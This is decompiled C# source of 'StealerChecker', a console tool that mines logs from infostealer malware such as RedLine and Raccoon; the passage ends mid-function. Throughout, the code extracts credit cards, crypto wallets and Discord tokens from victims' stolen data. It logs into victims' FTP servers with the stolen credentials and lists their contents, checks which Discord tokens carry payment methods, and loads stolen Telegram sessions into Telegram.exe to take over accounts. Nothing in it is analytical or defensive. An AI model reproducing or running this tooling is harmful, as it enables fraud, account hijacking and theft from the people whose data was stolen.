// Decompiled with JetBrains decompiler
// Type: stealerchecker.Program
// Assembly: stealerchecker, Version=9.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EACD1CA4-3D73-4169-BD60-7A660205DCFD
// Assembly location: C:\Users\fox89\Desktop\StealerChecker\stealerchecker.exe

using CommandLine;
using Everything;
using Everything.Model;
using Everything.Search;
using FluentFTP;
using Leaf.xNet;
using Newtonsoft.Json.Linq;
using stealerchecker.Checkers;
using stealerchecker.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using TemnijExt;

namespace stealerchecker
{
  public static class Program
  {
    private const string tag = "9.3";
    private const string caption = "StealerChecker v9.3 by Temnij";
    private static readonly List<Log> files = new List<Log>();
    private static readonly List<string> directories = new List<string>();
    public static readonly string NewLine = Environment.NewLine;
    private static readonly List<string> patterns = new List<string>()
    {
      "InfoHERE.txt",
      "InfoHERE.html",
      "UserInformation.txt",
      "~Work.log",
      "System Info.txt",
      "_Information.txt",
      "information.txt",
      "system_info.txt",
      "readme.txt",
      "LogInfo.txt"
    };
    private static readonly List<string> names = new List<string>()
    {
      "Echelon",
      "Echelon (mod)",
      "RedLine",
      "DCRat Stealer",
      "Raccoon Stealer",
      "Unknown stealer (44CALIBER?)",
      "COLLECTOR",
      "Unknown stealer",
      "HUNTER",
      "Unknown Stealer"
    };
    private static Program.Options opt = new Program.Options();
    private static readonly List<string> goodFTPs = new List<string>();
    internal static int counter;
    private static IEnumerable<Program.Password> glob;
    private static int progress;
    private static readonly Program.Menu SearchMenu = new Program.Menu()
    {
      menu = new Dictionary<string, Action>()
      {
        {
          "Search by URL",
          (Action) (() => Program.SearchByURL(Ext.Input("Enter query", Color.LightSkyBlue)))
        },
        {
          "Search by Password",
          (Action) (() => Program.SearchByPass(Ext.Input("Enter query", Color.LightSkyBlue)))
        },
        {
          "Search by Username",
          (Action) (() => Program.SearchByUsername(Ext.Input("Enter query", Color.LightSkyBlue)))
        }
      }.ToList<KeyValuePair<string, Action>>(),
      Name = "Searhing"
    };
    private static readonly Program.Menu SortMenu = new Program.Menu()
    {
      menu = new Dictionary<string, Action>()
      {
        {
          "Sort by date",
          new Action(Program.SortLogs)
        },
        {
          "Sort login:pass by categories",
          new Action(Program.SortLogsbyCategories)
        }
      }.ToList<KeyValuePair<string, Action>>(),
      Name = "Sorting"
    };
    private static readonly Program.Menu GetMenu = new Program.Menu()
    {
      menu = new Dictionary<string, Action>()
      {
        {
          "Get CC cards",
          new Action(Program.GetCC)
        },
        {
          "Get&Check FTP servers",
          new Action(Program.GetFTP)
        },
        {
          "Get Discord tokens",
          new Action(Program.GetDiscord)
        },
        {
          "Get Telegrams",
          new Action(Program.GetTelegram)
        },
        {
          "Get Cold Wallets",
          (Action) (() => Program.WalletsMenu.Print())
        }
      }.ToList<KeyValuePair<string, Action>>(),
      Name = "Getting"
    };
    private static readonly Program.Menu WalletsMenu = new Program.Menu()
    {
      menu = new Dictionary<string, Action>()
      {
        {
          "Get All Wallets",
          new Action(Program.GetAllWallets)
        },
        {
          "Get Metamask Wallets",
          (Action) (() => Program.GetSpecWallets("Metamask"))
        },
        {
          "Get Exodus Wallets",
          (Action) (() => Program.GetSpecWallets("Exodus"))
        },
        {
          "Get Bitcoin Wallets",
          (Action) (() => Program.GetSpecWallets("Bitcoin"))
        },
        {
          "Get DogeCoin Wallets",
          (Action) (() => Program.GetSpecWallets("Dogecoin"))
        }
      }.ToList<KeyValuePair<string, Action>>(),
      Name = "Cold Wallets"
    };
    private static readonly Program.Menu CheckersMenu = new Program.Menu()
    {
      menu = new Dictionary<string, Action>()
      {
        {
          string.Format("Check all services (current: {0})", (object) Program.checkers?.Count),
          new Action(Program.CheckAll)
        },
        {
          "Set proxy (required for checkers)",
          new Action(Program.SetProxy)
        }
      }.ToList<KeyValuePair<string, Action>>(),
      Name = "Check (ALPHA)"
    };
    private static readonly List<string> wallets = new List<string>()
    {
      "Atomic",
      "Exodus",
      "Electrum",
      "NetboxWallet",
      "Monero",
      "Bitcoin",
      "Lobstex",
      "Koto",
      "Metamask",
      "Dogecoin",
      "HappyCoin",
      "curecoin",
      "BitcoinGod",
      "BinanceChain",
      "Tronlink",
      "BitcoinCore",
      "Armory",
      "LitecoinCore",
      "Yoroi"
    };
    private static readonly List<IChecker> checkers = new List<IChecker>()
    {
      (IChecker) new Aternos()
    };
    private static List<string> proxy = new List<string>();
    private static ProxyType type;

    public static void Main(string[] args)
    {
      Colorful.Console.WindowWidth = 86;
      Colorful.Console.BufferWidth = 86;
      Colorful.Console.BufferHeight = 9999;
      Colorful.Console.BackgroundColor = Color.Black;
      Program.SetStatus();
      Parser.Default.ParseArguments<Program.Options>((IEnumerable<string>) args).WithParsed<Program.Options>((Action<Program.Options>) (o => Program.opt = o));
      if (string.IsNullOrEmpty(Program.opt.Path))
      {
        Colorful.Console.Clear();
        Program.opt.Path = Program.GetDialog();
      }
      try
      {
        Program.Update();
      }
      catch
      {
        Colorful.Console.WriteLine("Update check error.. Seems, you are haven't internet connection..\nPress any key...", Color.Pink);
        Colorful.Console.ReadKey();
      }
      Colorful.Console.WriteLine("Please wait, loading...", Color.LightCyan);
      if (((IEnumerable<Process>) Process.GetProcesses()).Any<Process>((Func<Process, bool>) (x => x.ProcessName.IndexOf("everything", StringComparison.OrdinalIgnoreCase) >= 0)) && !Program.opt.Everything)
      {
        Colorful.Console.WriteLine("It looks like you are using Everything. Turn it on? [y/n]", Color.LightGreen);
        Program.opt.Everything = !Colorful.Console.ReadLine().Equals("n", StringComparison.OrdinalIgnoreCase);
      }
      if (!Program.opt.Everything)
      {
        Program.SetStatus("Adding Directories...");
        Program.AddDirectories();
        Colorful.Console.WriteLine(string.Format("Directories added: {0}", (object) Program.directories.Count), Color.Gray);
        Program.SetStatus("Adding files...");
        Program.AddFiles();
        Colorful.Console.WriteLine(string.Format("Files added: {0}", (object) Program.files.Count), Color.Gray);
      }
      else
        Program.GetFilesAsync().Wait();
      Program.glob = Program.GetPasswords();
      Colorful.Console.Clear();
      Program.SetStatus();
      while (true)
        Program.PrintMainMenu();
    }

    internal static void Update()
    {
      using (WebClient webClient = new WebClient())
      {
        webClient.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.73";
        string str = JObject.Parse(webClient.DownloadString("https://api.github.com/repos/kzorin52/stealerchecker/releases/latest"))["tag_name"]?.ToString();
        int num1 = int.Parse("9.3".Replace(".", ""));
        if (str == null)
          return;
        int num2 = int.Parse(str.Replace(".", ""));
        if (num1 >= num2)
          return;
        Colorful.Console.WriteLine("|| Warning! Update is aviable! Current version: 9.3, new version - " + str + " ||", Color.LightGreen);
        Colorful.Console.WriteLine("|| For update go to https://github.com/kzorin52/stealerchecker/releases/latest ||", Color.LightGreen);
        Colorful.Console.WriteLine("__ to continue press any key __", Color.LightCyan);
        Colorful.Console.ReadKey();
      }
    }

    internal static void AddDirectories() => Program.directories.AddRange((IEnumerable<string>) Directory.GetDirectories(Program.opt.Path, "*", SearchOption.AllDirectories));

    internal static void AddFiles() => Program.files.AddRange((IEnumerable<Log>) Program.directories.AsParallel<string>().SelectMany<string, Log>((Func<string, IEnumerable<Log>>) (dir =>
    {
      try
      {
        return ((IEnumerable<string>) Directory.GetFiles(dir)).AsParallel<string>().Where<string>((Func<string, bool>) (x => Program.patterns.Contains(Path.GetFileName(x)))).Select<string, Log>((Func<string, Log>) (x => new Log(x))).AsEnumerable<Log>();
      }
      catch
      {
        return (IEnumerable<Log>) new Log[1];
      }
    })).Where<Log>((Func<Log, bool>) (x => !string.IsNullOrEmpty(x.Name))));

    public static string GetDialog(bool incorrect = false)
    {
      string dialog;
      while (true)
      {
        if (incorrect)
        {
          Colorful.Console.Clear();
          Colorful.Console.WriteLine("Incorrect input!" + Environment.NewLine, Color.Pink);
        }
        Colorful.Console.WriteLine("Enter path to folder with logs...", Color.LightGreen);
        dialog = Colorful.Console.ReadLine().Replace("\"", "");
        if (string.IsNullOrEmpty(dialog))
          incorrect = true;
        else
          break;
      }
      return dialog;
    }

    internal static void GetCC()
    {
      foreach (Log file1 in Program.files)
      {
        Program.SetStatus(string.Format("Working... {0}%", (object) Math.Round(Program.GetPercent(Program.files.Count, Program.files.IndexOf(file1)))));
        string name = file1.Name;
        if (!(name == "InfoHERE.txt") && !(name == "InfoHERE.html"))
        {
          if (!(name == "UserInformation.txt"))
          {
            if (!(name == "information.txt"))
            {
              if (name == "readme.txt")
              {
                string directoryName = new FileInfo(file1.FullPath).DirectoryName;
                if (System.IO.File.Exists(Path.Combine(directoryName, "Browser", "Cards.txt")))
                {
                  string str = System.IO.File.ReadAllText(Path.Combine(directoryName, "Browser", "Cards.txt"));
                  if (!string.IsNullOrEmpty(str))
                  {
                    Colorful.Console.WriteLine(directoryName, Color.Green);
                    Colorful.Console.WriteLine(str, Color.LightCyan);
                  }
                }
              }
            }
            else
            {
              string directoryName = new FileInfo(file1.FullPath).DirectoryName;
              if (Directory.Exists(Path.Combine(directoryName, "CC")))
              {
                foreach (string file2 in Directory.GetFiles(Path.Combine(directoryName, "CC")))
                {
                  string str = System.IO.File.ReadAllText(file2);
                  if (!string.IsNullOrEmpty(str))
                  {
                    Colorful.Console.WriteLine(directoryName, Color.Green);
                    Colorful.Console.WriteLine(str, Color.LightCyan);
                  }
                }
              }
            }
          }
          else
          {
            string directoryName = new FileInfo(file1.FullPath).DirectoryName;
            if (Directory.Exists(Path.Combine(directoryName, "CreditCards")))
            {
              foreach (string file3 in Directory.GetFiles(Path.Combine(directoryName, "CreditCards")))
              {
                string str = Regex.Matches(System.IO.File.ReadAllText(file3), "Holder: (.*)\\s*CardType: (.*)\\s*Card: (.*)\\s*Expire: (.*)").OfType<Match>().AsParallel<Match>().Select(x => new
                {
                  Holder = x.Groups[1].Value,
                  CardType = x.Groups[2].Value,
                  Card = x.Groups[3].Value,
                  Expire = x.Groups[4].Value
                }).Select(y => y.CardType + " | " + y.Card + " " + y.Expire + " " + y.Holder).Join();
                if (!string.IsNullOrEmpty(str))
                {
                  Colorful.Console.WriteLine(directoryName, Color.Green);
                  Colorful.Console.WriteLine(str, Color.LightCyan);
                }
              }
            }
          }
        }
        else
        {
          int num = int.Parse(Regex.Match(System.IO.File.ReadAllText(file1.FullPath), "∟\uD83D\uDCB3(\\d*)").Groups[1].Value);
          if (num > 0)
          {
            Colorful.Console.Write("[" + file1.FullPath + "]", Color.Green);
            Colorful.Console.WriteLine(string.Format(" - {0} cards!", (object) num));
            try
            {
              Colorful.Console.WriteLine(Program.WriteCC(file1.FullPath), Color.LightCyan);
            }
            catch
            {
            }
          }
        }
      }
      Program.SetStatus();
    }

    internal static string WriteCC(string path) => ((IEnumerable<string>) Directory.GetFiles(Path.Combine(new FileInfo(path).DirectoryName ?? "", "Browsers", "Cards"))).Where<string>((Func<string, bool>) (x => new FileInfo(x).Length > 5L)).Select<string, string>((Func<string, string>) (x => System.IO.File.ReadAllText(x) + Program.NewLine)).Join();

    internal static void GetFTP()
    {
      int z = 0;
      List<Thread> threadList = Program.files.ConvertAll<Thread>((Converter<Log, Thread>) (file => new Thread((ThreadStart) (() =>
      {
        Program.SetStatus(string.Format("Getting... {0}%", (object) Math.Round(Program.GetPercent(Program.files.Count, z++), 1)));
        string name = file.Name;
        if (!(name == "InfoHERE.txt"))
        {
          if (!(name == "InfoHERE.html"))
          {
            if (!(name == "UserInformation.txt"))
              return;
            string fullName = new FileInfo(file.FullPath).Directory?.FullName;
            if (fullName == null || !Directory.Exists(Path.Combine(fullName, "FTP")) || !System.IO.File.Exists(Path.Combine(fullName, "FTP", "Credentials.txt")))
              return;
            Colorful.Console.Write("[" + new FileInfo(file.FullPath).Directory?.FullName + "]", Color.Green);
            Colorful.Console.WriteLine(" - FTP");
            Program.CheckRedlineFtp(System.IO.File.ReadAllText(Path.Combine(fullName, "FTP", "Credentials.txt")));
          }
          else
          {
            if (!Regex.Match(System.IO.File.ReadAllText(file.FullPath), "<h2 style=\"color:white\">\uD83D\uDCE1 FTP<\\/h2>\\s*<p style=\"color:white\">   ∟ FileZilla: (❌|✅)<\\/p>\\s*<p style=\"color:white\">   ∟ TotalCmd: (❌|✅)<\\/p>").Groups[1].Value.Equals("✅"))
              return;
            Colorful.Console.Write("[" + new FileInfo(file.FullPath).Directory?.FullName + "]", Color.Green);
            Colorful.Console.WriteLine(" - FileZila");
            Program.WriteFileZila(file.FullPath);
          }
        }
        else
        {
          if (!Regex.Match(System.IO.File.ReadAllText(file.FullPath), "\uD83D\uDCE1 FTP\\s*∟ FileZilla: (❌|✅).*\\s*∟ TotalCmd: (❌|✅).*").Groups[1].Value.Equals("✅"))
            return;
          Colorful.Console.Write("[" + new FileInfo(file.FullPath).Directory?.FullName + "]", Color.Green);
          Colorful.Console.WriteLine(" - FileZila");
          Program.WriteFileZila(file.FullPath);
        }
      }))));
      foreach (Thread thread in threadList)
        thread.Start();
      int num = 0;
      foreach (Thread th in threadList)
      {
        Program.SetStatus(string.Format("Checking... {0}%", (object) Math.Round(Program.GetPercent(threadList.Count, num++), 1)));
        th.Wait();
      }
      Colorful.Console.WriteLine("Good FTPs:" + Program.NewLine + Program.goodFTPs.Distinct<string>().Join(), Color.LightGreen);
      System.IO.File.WriteAllLines("goodFTPs.txt", Program.goodFTPs.Distinct<string>());
      Program.goodFTPs.Clear();
      Program.SetStatus();
    }

    internal static void WriteFileZila(string path)
    {
      string directoryName = new FileInfo(path).DirectoryName;
      if (directoryName == null)
        return;
      List<Thread> list = ((IEnumerable<string>) Directory.GetFiles(Path.Combine(directoryName, "FileZilla"))).Where<string>((Func<string, bool>) (x => new FileInfo(x).Length > 5L)).Select<string, Thread>((Func<string, Thread>) (file => new Thread((ThreadStart) (() => Program.CheckFileZilla(System.IO.File.ReadAllText(file)))))).ToList<Thread>();
      foreach (Thread thread in list)
        thread.Start();
      foreach (Thread th in list)
        th.Wait();
    }

    internal static void CheckFileZilla(string fileZillaLog)
    {
      foreach (Match match in Regex.Matches(fileZillaLog, "Host: (.*)\\s*Port: (.*)\\s*User: (.*)\\s*Pass: (.*)"))
      {
        var data = new
        {
          Host = match.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
          Port = match.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
          User = match.Groups[3].Value.Replace("\r", "").Replace("\\r", ""),
          Pass = match.Groups[4].Value.Replace("\r", "").Replace("\\r", "")
        };
        try
        {
          using (FtpClient client = new FtpClient(data.Host)
          {
            Port = int.Parse(data.Port),
            Credentials = new NetworkCredential(data.User, data.Pass),
            ConnectTimeout = 5000,
            DataConnectionConnectTimeout = 5000,
            DataConnectionReadTimeout = 5000,
            ReadTimeout = 5000
          })
          {
            client.Connect();
            string str1 = Program.NewLine + ((IEnumerable<FtpListItem>) client.GetListing("/")).AsParallel<FtpListItem>().Select<FtpListItem, string>((Func<FtpListItem, string>) (x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))).Join() + Program.NewLine;
            client.Disconnect();
            string str2 = data.Host + ":" + data.Port + ";" + data.User + ":" + data.Pass + " - GOOD" + str1;
            Program.goodFTPs.Add(str2);
          }
        }
        catch (FtpAuthenticationException ex)
        {
          try
          {
            using (FtpClient client = new FtpClient(data.Host)
            {
              Port = int.Parse(data.Port),
              Credentials = new NetworkCredential("anonymous", ""),
              ConnectTimeout = 5000,
              DataConnectionConnectTimeout = 5000,
              DataConnectionReadTimeout = 5000,
              ReadTimeout = 5000
            })
            {
              client.Connect();
              string str3 = Program.NewLine + ((IEnumerable<FtpListItem>) client.GetListing("/")).AsParallel<FtpListItem>().Select<FtpListItem, string>((Func<FtpListItem, string>) (x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))).Join() + Program.NewLine;
              client.Disconnect();
              string str4 = data.Host + ":" + data.Port + ";anonymous: - GOOD" + str3;
              Program.goodFTPs.Add(str4);
            }
          }
          catch
          {
          }
        }
        catch
        {
        }
      }
    }

    internal static void CheckRedlineFtp(string redLineLog)
    {
      foreach (Match match in Regex.Matches(redLineLog, "Server: (.*):(.*)\\s*Username: (.*)\\s*Password: (.*)\\s*"))
      {
        var data = new
        {
          Host = match.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
          Port = match.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
          User = match.Groups[3].Value.Replace("\r", "").Replace("\\r", ""),
          Pass = match.Groups[4].Value.Replace("\r", "").Replace("\\r", "")
        };
        try
        {
          using (FtpClient client = new FtpClient(data.Host)
          {
            Port = int.Parse(data.Port),
            Credentials = new NetworkCredential(data.User, data.Pass),
            ConnectTimeout = 5000,
            DataConnectionConnectTimeout = 5000,
            DataConnectionReadTimeout = 5000,
            ReadTimeout = 5000
          })
          {
            client.Connect();
            string str1 = Program.NewLine + ((IEnumerable<FtpListItem>) client.GetListing("/")).AsParallel<FtpListItem>().Select<FtpListItem, string>((Func<FtpListItem, string>) (x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))).Join() + Program.NewLine;
            client.Disconnect();
            string str2 = data.Host + ":" + data.Port + ";" + data.User + ":" + data.Pass + " - GOOD" + str1;
            Program.goodFTPs.Add(str2);
          }
        }
        catch (FtpAuthenticationException ex)
        {
          try
          {
            using (FtpClient client = new FtpClient(data.Host)
            {
              Port = int.Parse(data.Port),
              Credentials = new NetworkCredential("anonymous", ""),
              ConnectTimeout = 5000,
              DataConnectionConnectTimeout = 5000,
              DataConnectionReadTimeout = 5000,
              ReadTimeout = 5000
            })
            {
              client.Connect();
              string str3 = Program.NewLine + ((IEnumerable<FtpListItem>) client.GetListing("/")).AsParallel<FtpListItem>().Select<FtpListItem, string>((Func<FtpListItem, string>) (x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))).Join() + Program.NewLine;
              client.Disconnect();
              string str4 = data.Host + ":" + data.Port + ";anonymous: - GOOD" + str3;
              Program.goodFTPs.Add(str4);
            }
          }
          catch
          {
          }
        }
        catch
        {
        }
      }
    }

    internal static void GetDiscord()
    {
      List<CheckResult> source = new List<CheckResult>();
      foreach (Log file in Program.files)
      {
        FileInfo fileInfo = new FileInfo(file.FullPath);
        Program.SetStatus(string.Format("Working... {0}%", (object) Math.Round(Program.GetPercent(Program.files.Count, Program.files.IndexOf(file)), 3)));
        if (!fileInfo.Name.Equals("InfoHERE.txt"))
        {
          if (!fileInfo.Name.Equals("InfoHERE.html"))
          {
            try
            {
              source.AddRange((IEnumerable<CheckResult>) Program.WriteDiscord(file.FullPath));
              continue;
            }
            catch
            {
              continue;
            }
          }
        }
        bool flag = Regex.Match(System.IO.File.ReadAllText(file.FullPath), "\uD83D\uDCAC Discord: (✅|❌)").Groups[1].Value.Equals("✅");
        try
        {
          if (flag)
            source.AddRange((IEnumerable<CheckResult>) Program.WriteDiscord(file.FullPath));
        }
        catch
        {
        }
      }
      Program.SetStatus();
      System.IO.File.WriteAllLines("DiscordTokens_All.txt", source.Distinct<CheckResult>().Select<CheckResult, string>((Func<CheckResult, string>) (x => x.Token)));
      System.IO.File.WriteAllLines("DiscordTokens_Working.txt", source.Distinct<CheckResult>().Where<CheckResult>((Func<CheckResult, bool>) (x => x.IsValid)).Select<CheckResult, string>((Func<CheckResult, string>) (x => x.Token)));
      System.IO.File.WriteAllLines("DiscordTokens_WithPayment.txt", source.Distinct<CheckResult>().Where<CheckResult>((Func<CheckResult, bool>) (x => x.Payment)).Select<CheckResult, string>((Func<CheckResult, string>) (x => x.Token)));
    }

    internal static List<CheckResult> WriteDiscord(string path)
    {
      List<CheckResult> checkResultList = new List<CheckResult>();
      string fullName = FileCl.Load(path).Info.Directory?.FullName;
      string path1 = (string) null;
      string fileName = Path.GetFileName(path);
      if (!(fileName == "InfoHERE.txt") && !(fileName == "InfoHERE.html"))
      {
        if (!(fileName == "UserInformation.txt"))
        {
          if (!(fileName == "~Work.log"))
          {
            if (!(fileName == "information.txt"))
            {
              if (fileName == "LogInfo.txt" && fullName != null)
                path1 = Path.Combine(fullName, "Discord", "leveldb");
            }
            else if (fullName != null)
              path1 = Path.Combine(fullName, "Discord", "botty");
          }
          else if (fullName != null)
            path1 = Path.Combine(fullName, "Other");
        }
        else if (fullName != null)
          path1 = Path.Combine(fullName, "Discord");
      }
      else if (fullName != null)
        path1 = Path.Combine(fullName, "Discord", "Local Storage", "leveldb");
      foreach (string file in Directory.GetFiles(path1))
      {
        try
        {
          FileCl fileCl = FileCl.Load(file);
          if (fileCl.Info.Length > 5L)
          {
            List<string> list = Program.CheckDiscord(fileCl.GetContent()).ToList<string>();
            if (list.Count != 0)
            {
              Colorful.Console.WriteLine(list.Join() ?? "", Color.LightGreen);
              checkResultList.AddRange(list.Select<string, CheckResult>(new Func<string, CheckResult>(DiscordChecker.CheckToken)));
            }
          }
        }
        catch
        {
        }
      }
      return checkResultList;
    }

    internal static IEnumerable<string> CheckDiscord(string content) => Regex.Matches(content, "[MN][A-Za-z\\d]{23}\\.[\\w-]{6}\\.[\\w-]{27}").OfType<Match>().Select<Match, string>((Func<Match, string>) (x => x.Value)).Distinct<string>();

    internal static void SearchByURL(string query)
    {
      Program.SetStatus("Working... ");
      Colorful.Console.WriteLine(Program.SearchByURLHelper(query).Join(), Color.LightGreen);
      Program.SetStatus();
    }

    private static ParallelQuery<string> SearchByURLHelper(string query) => Program.glob.AsParallel<Program.Password>().Where<Program.Password>((Func<Program.Password, bool>) (x => x.Url.AnyNew(query))).Select<Program.Password, string>((Func<Program.Password, string>) (y => y.Login + ":" + y.Pass + (Program.opt.Verbose ? "\t" + y.Url : ""))).Distinct<string>();

    internal static void SearchByUsername(string query)
    {
      Program.SetStatus("Working... ");
      Colorful.Console.WriteLine(Program.SearchByUsernameHelper(query).Join(), Color.LightGreen);
      Program.SetStatus();
    }

    private static IEnumerable<string> SearchByUsernameHelper(string query) => (IEnumerable<string>) Program.glob.AsParallel<Program.Password>().Where<Program.Password>((Func<Program.Password, bool>) (x => x.Login.AnyNew(query))).Select<Program.Password, string>((Func<Program.Password, string>) (y => y.Login + ":" + y.Pass + (Program.opt.Verbose ? "\t" + y.Url : ""))).Distinct<string>();

    internal static void SearchByPass(string query)
    {
      Program.SetStatus("Working... ");
      Colorful.Console.WriteLine(Program.SearchByPassHelper(query).Join(), Color.LightGreen);
      Program.SetStatus();
    }

    private static IEnumerable<string> SearchByPassHelper(string query) => (IEnumerable<string>) Program.glob.AsParallel<Program.Password>().Where<Program.Password>((Func<Program.Password, bool>) (x => x.Pass.AnyNew(query))).Select<Program.Password, string>((Func<Program.Password, string>) (y => y.Login + ":" + y.Pass + (Program.opt.Verbose ? "\t" + y.Url : ""))).Distinct<string>();

    internal static void GetTelegram()
    {
      if (!Directory.Exists("Telegram"))
        Directory.CreateDirectory("Telegram");
      foreach (Log file in Program.files)
      {
        string name = file.Name;
        if (name.Equals("InfoHERE.txt") || name.Equals("InfoHERE.html"))
        {
          if (Regex.Match(System.IO.File.ReadAllText(file.FullPath), "✈️ Telegram: (❌|✅)").Groups[1].Value.Equals("✅"))
            Program.CopyTelegram(in file.FullPath);
        }
        else
        {
          string directoryName1 = new FileInfo(file.FullPath).DirectoryName;
          if (directoryName1 != null && name.Equals("~Work.log") && Directory.Exists(Path.Combine(directoryName1, "Other", "Telegram", "tdata")))
          {
            Program.CopyTelegram(in file.FullPath);
          }
          else
          {
            string directoryName2 = new FileInfo(file.FullPath).DirectoryName;
            string str = name;
            if (!(str == "UserInformation.txt"))
            {
              if (!(str == "LogInfo.txt") || directoryName2 == null || !Directory.Exists(Path.Combine(directoryName2, "Telegram")))
                continue;
            }
            else if (directoryName2 == null || !Directory.Exists(Path.Combine(directoryName2, "Telegram", "Profile_1")))
              continue;
            Program.CopyTelegram(in file.FullPath);
          }
        }
      }
      Program.SetStatus();
      while (true)
      {
        foreach (string str in (IEnumerable<string>) ((IEnumerable<string>) Directory.GetDirectories("Telegram")).Select<string, string>((Func<string, string>) (dir => new DirectoryInfo(dir).Name)).ToList<string>().OrderBy<string, int>(new Func<string, int>(int.Parse)))
          Colorful.Console.WriteLine(str, Color.LightGreen);
        Colorful.Console.WriteLine("Select Telegram:", Color.Green);
        int num = int.Parse(Colorful.Console.ReadLine());
        try
        {
          Directory.Delete("tdata");
        }
        catch
        {
        }
        Program.SetStatus("Copying Telegram session");
        Program.CopyFiles(Path.Combine("Telegram", num.ToString()), "tdata");
        Program.SetStatus();
        Process.Start("Telegram.exe");
        Colorful.Console.ReadLine();
        ((IEnumerable<Process>) Process.GetProcessesByName(Path.GetFullPath("Telegram.exe"))).ToList<Process>().ForEach((Action<Process>) (pr => pr.Kill()));
      }
    }

    internal static void CopyTelegram(in string path)
    {
      string fullName = FileCl.Load(path).Info.Directory?.FullName;
      string str = "";
      string fileName = Path.GetFileName(path);
      if (!(fileName == "InfoHERE.txt") && !(fileName == "InfoHERE.html"))
      {
        if (!(fileName == "~Work.log"))
        {
          if (!(fileName == "UserInformation.txt"))
          {
            if (fileName == "LogInfo.txt")
              str = Path.Combine(new FileInfo(path).DirectoryName ?? string.Empty, "Telegram");
          }
          else
            str = Path.Combine(new FileInfo(path).DirectoryName ?? string.Empty, "Telegram", "Profile_1");
        }
        else
          str = Path.Combine(new FileInfo(path).DirectoryName ?? string.Empty, "Other", "Telegram", "tdata");
      }
      else
        str = Array.Find<string>(Directory.GetDirectories(fullName), (Predicate<string>) (x => new DirectoryInfo(x).Name.StartsWith("Telegram")));
      Program.CopyFiles(str, Path.Combine(Directory.GetCurrentDirectory(), "Telegram", Program.counter.ToString()));
      if (fileName.Equals("LogInfo.txt"))
        Program.CopyFiles(Path.Combine(str, "tdata"), Path.Combine(Directory.GetCurrentDirectory(), "Telegram", Program.counter.ToString()));
      Program.SetStatus(string.Format("{0} telegram dirs copied", (object) Program.counter++));
    }

    private static void CopyFiles(string sourcePath, string targetPath)
    {
      try
      {
        if (!Directory.Exists(targetPath))
          Directory.CreateDirectory(targetPath);
      }
      catch
      {
      }
      foreach (string directory in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
        Directory.CreateDirectory(directory.Replace(sourcePath, targetPath));
      foreach (string file in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
        System.IO.File.Copy(file, file.Replace(sourcePath, targetPath), true);
    }

    internal static void SortLogs()
    {
      List<KeyValuePair<string, DateTime>> keyValuePairList = new List<KeyValuePair<string, DateTime>>();
      Colorful.Console.WriteLine("Loading...", Color.DarkCyan);
      foreach (Log file in Program.files)
      {
        if (file.Name.Equals("InfoHERE.txt"))
        {
          FileCl fileCl = FileCl.Load(file.FullPath);
          if (fileCl.Info.Directory != null)
          {
            string fullName = fileCl.Info.Directory.FullName;
            string path = Path.Combine(fullName, "System_Information.txt");
            Match match1 = Regex.Match(System.IO.File.ReadAllText(path), "Current time Utc: ((\\d*)\\.(\\d*)\\.(\\d*) (\\d*):(\\d*):(\\d*))");
            Match match2 = Regex.Match(System.IO.File.ReadAllText(path), "Current time Utc: ((\\d*)\\/(\\d*)\\/(\\d*) (\\d*):(\\d*):(\\d*) (AM|PM))");
            DateTime dateTime = DateTime.Now;
            if (match1.Success)
              dateTime = DateTime.Parse(match1.Groups[1].Value);
            keyValuePairList.Add(new KeyValuePair<string, DateTime>(fullName, dateTime));
            if (match2.Success)
              dateTime = DateTime.ParseExact(match2.Groups[1].Value, "M/d/yyyy h:mm:ss tt", (IFormatProvider) CultureInfo.InvariantCulture);
            keyValuePairList.Add(new KeyValuePair<string, DateTime>(fullName, dateTime));
          }
        }
      }
      Colorful.Console.WriteLine("Loaded!", Color.LightGreen);
      Colorful.Console.WriteLine();
      Colorful.Console.WriteLine("Sorting by Year/Month...", Color.DarkCyan);
      if (!Directory.Exists("Sorts"))
      {
        Directory.CreateDirectory("Sorts");
      }
      else
      {
        Colorful.Console.WriteLine("Directory exists, deleting...", Color.Pink);
        Program.DeleteFolder("Sorts");
        Colorful.Console.WriteLine("Deleted!", Color.LightGreen);
        Directory.CreateDirectory("Sorts");
      }
      foreach (KeyValuePair<string, DateTime> keyValuePair in keyValuePairList)
      {
        DateTime dateTime = keyValuePair.Value;
        string key = keyValuePair.Key;
        string path2 = dateTime.Year.ToString();
        string path3 = dateTime.Month.ToString();
        if (!Directory.Exists(Path.Combine("Sorts", path2)))
          Directory.CreateDirectory(Path.Combine("Sorts", path2));
        if (!Directory.Exists(Path.Combine("Sorts", path2, path3)))
          Directory.CreateDirectory(Path.Combine("Sorts", path2, path3));
        Program.CopyFiles(key, Path.Combine("Sorts", path2, path3, new DirectoryInfo(key).Name));
        Program.SetStatus(string.Format("Copying... Directory {0}/{1}", (object) keyValuePairList.IndexOf(keyValuePair), (object) keyValuePairList.Count));
      }
      Program.SetStatus();
      Colorful.Console.WriteLine("Sorted!", Color.Green);
    }

    private static void DeleteFolder(string folder)
    {
      try
      {
        DirectoryInfo directoryInfo1 = new DirectoryInfo(folder);
        DirectoryInfo[] directories = directoryInfo1.GetDirectories();
        foreach (FileSystemInfo file in directoryInfo1.GetFiles())
          file.Delete();
        foreach (DirectoryInfo directoryInfo2 in directories)
        {
          Program.DeleteFolder(directoryInfo2.FullName);
          if (directoryInfo2.GetDirectories().Length == 0 && directoryInfo2.GetFiles().Length == 0)
            directoryInfo2.Delete();
        }
      }
      catch (DirectoryNotFoundException ex)
      {
        Colorful.Console.WriteLine("Директория не найдена. Ошибка: " + ex.Message);
      }
